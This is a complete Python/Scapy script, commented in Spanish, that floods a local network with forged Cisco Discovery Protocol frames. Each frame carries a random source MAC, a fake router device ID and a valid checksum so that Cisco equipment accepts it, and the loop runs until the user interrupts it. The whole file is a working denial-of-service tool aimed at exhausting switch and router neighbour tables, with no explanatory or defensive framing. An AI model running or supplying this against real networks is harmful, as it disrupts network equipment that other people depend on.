#!/usr/bin/env python3
import sys
import time
import struct
from scapy.all import *

# --- CONFIGURACIÓN ---
interface = "eth0"
# ---------------------

def calcular_checksum(data):
    """
    Calcula el checksum estándar de Internet (RFC 1071)
    necesario para que Cisco acepte el paquete.
    """
    if len(data) % 2 == 1:
        data += b'\0'
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

def crear_tlv(tipo, valor):
    if isinstance(valor, str):
        val_bytes = valor.encode('utf-8')
    else:
        val_bytes = valor
    length = 4 + len(val_bytes)
    return struct.pack("!HH", tipo, length) + val_bytes

print(f"[*] Iniciando CDP Flood (Modo RAW + Checksum Real) en {interface}...")
print("[*] Ahora calculamos la firma matemática de cada paquete.")
print("[*] Presiona Ctrl+C para detener.")

try:
    packet_count = 0
    while True:
        # 1. Datos aleatorios
        mac_src = RandMAC()
        device_id = f"Router_Hack_{RandNum(100,999)}"
        port_id = f"Ethernet{RandNum(0,3)}/{RandNum(0,3)}"
        
        # 2. Preparamos los TLVs
        tlvs = b""
        tlvs += crear_tlv(0x0001, device_id)               # Device ID
        tlvs += crear_tlv(0x0003, port_id)                 # Port ID
        tlvs += crear_tlv(0x0004, b'\x00\x00\x00\x01')     # Capabilities (Router)
        tlvs += crear_tlv(0x0005, "Cisco IOS 15.2 (IOU)")  # Software Version
        tlvs += crear_tlv(0x0006, "Cisco IOU L3")          # Platform

        # 3. Calculamos el Checksum
        # Paso A: Creamos una cabecera temporal con Checksum 0
        # Version(2) + TTL(180) + Checksum(0)
        temp_header = b'\x02\xb4\x00\x00'
        data_to_checksum = temp_header + tlvs
        
        # Paso B: Calculamos el checksum correcto
        chk = calcular_checksum(data_to_checksum)
        
        # Paso C: Creamos la cabecera final con el checksum insertado
        final_header = struct.pack("!BBH", 2, 180, chk)
        
        # 4. Ensamblamos el paquete final
        payload = final_header + tlvs
        
        packet = Ether(src=mac_src, dst="01:00:0c:cc:cc:cc") / \
                 LLC(dsap=0xaa, ssap=0xaa, ctrl=3) / \
                 SNAP(OUI=0x00000c, code=0x2000) / \
                 Raw(load=payload)

        # 5. Enviar
        sendp(packet, iface=interface, verbose=0)
        
        packet_count += 1
        print(f"\r[+] Paquetes VÁLIDOS enviados: {packet_count}", end="")
        time.sleep(0.01) # Un poco más rápido

except KeyboardInterrupt:
    print("\nDetenido.")
except Exception as e:
    print(f"\nError: {e}")
